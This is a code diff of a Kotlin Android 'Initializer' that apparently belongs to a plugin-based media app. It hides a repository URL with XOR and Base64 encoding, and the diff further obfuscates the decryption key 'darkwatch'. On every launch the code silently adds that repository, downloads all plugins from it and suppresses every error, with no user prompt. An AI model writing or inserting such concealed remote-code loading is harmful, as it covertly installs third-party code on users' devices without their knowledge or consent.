@@ -9,17 +9,27 @@ import kotlinx.coroutines.*
 
 object Initializer {
 
-    private const val AUTO_REPO_FLAG = "auto_repo_added_v2"
+    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
+    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"
 
-    private fun decode(data: IntArray, key: Int = 7): String =
-        data.map { (it xor key).toChar() }.joinToString("")
+    private fun decode(data: IntArray, key: Int = 7): String {
+        val out = CharArray(data.size)
+        for (i in data.indices) {
+            out[i] = (data[i] xor key).toChar()
+        }
+        return String(out)
+    }
+
+    private val KEY_STR = intArrayOf(
+        100, 107, 104, 114, 99, 119, 107, 102, 126
+    )
 
     private val PREFS_NAME = intArrayOf(
-        100,107,104,114,99,116,115,114,101,102,106
+        100, 107, 104, 114, 99, 116, 115, 114, 101, 102, 106
     )
 
     private val REPO_NAME = intArrayOf(
-        66,115,115,68,107,114,99
+        66, 115, 115, 68, 107, 114, 99
     )
 
     private const val P1 = "CxgbBRdKQ04LAhtBEg0EBBQb"
@@ -28,13 +38,15 @@ object Initializer {
     private const val P4 = "TB4KBQteBhIWDQ=="
 
     private fun repoUrl(): String {
-        val key = "darkwatch".toByteArray()
+        val key = decode(KEY_STR).toByteArray()
         val encoded = P1 + P2 + P3 + P4
         val data = Base64.decode(encoded, Base64.DEFAULT)
 
-        return data.mapIndexed { i, b ->
-            (b.toInt() xor key[i % key.size].toInt()).toChar()
-        }.joinToString("")
+        val out = ByteArray(data.size)
+        for (i in data.indices) {
+            out[i] = (data[i].toInt() xor key[i % key.size].toInt()).toByte()
+        }
+        return String(out)
     }
 
     fun start(activity: Activity) {
@@ -43,45 +55,29 @@ object Initializer {
             Activity.MODE_PRIVATE
         )
 
-        if (prefs.getBoolean(AUTO_REPO_FLAG, false)) return
-
         val repo = RepositoryData(
             name = decode(REPO_NAME),
             url = repoUrl(),
             iconUrl = null
         )
 
-        // 🔥 FIX UTAMA ADA DI SINI
-        activity.lifecycleScope.launch {
+        CoroutineScope(Dispatchers.IO).launch {
             try {
-                // 1️⃣ Pastikan repository system siap
-                withContext(Dispatchers.IO) {
-                    RepositoryManager.loadRepositories(activity)
-                }
-
-                delay(500) // penting, jangan dihapus
-
-                // 2️⃣ Add repo kalau belum ada
-                if (RepositoryManager.getRepositories().none { it.url == repo.url }) {
+                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                     RepositoryManager.addRepository(repo)
+
+                    PluginsViewModel.downloadAll(activity, repo.url, null)
+
+                    prefs.edit()
+                        .putBoolean(AUTO_REPO_FLAG, true)
+                        .putBoolean(NEED_AUTO_DOWNLOAD, false)
+                        .apply()
                 }
 
-                // 3️⃣ Reload repo supaya plugin kebaca
-                withContext(Dispatchers.IO) {
-                    RepositoryManager.loadRepositories(activity)
-                }
-
-                delay(800) // ⚠️ INI KUNCI AUTO DOWNLOAD
-
-                // 4️⃣ AUTO DOWNLOAD SEMUA PROVIDER
                 PluginsViewModel.downloadAll(activity, repo.url, null)
 
-                // 5️⃣ Tandai selesai
-                prefs.edit()
-                    .putBoolean(AUTO_REPO_FLAG, true)
-                    .apply()
-
-            } catch (_: Throwable) {}
+            } catch (_: Throwable) {
+            }
         }
     }
 }
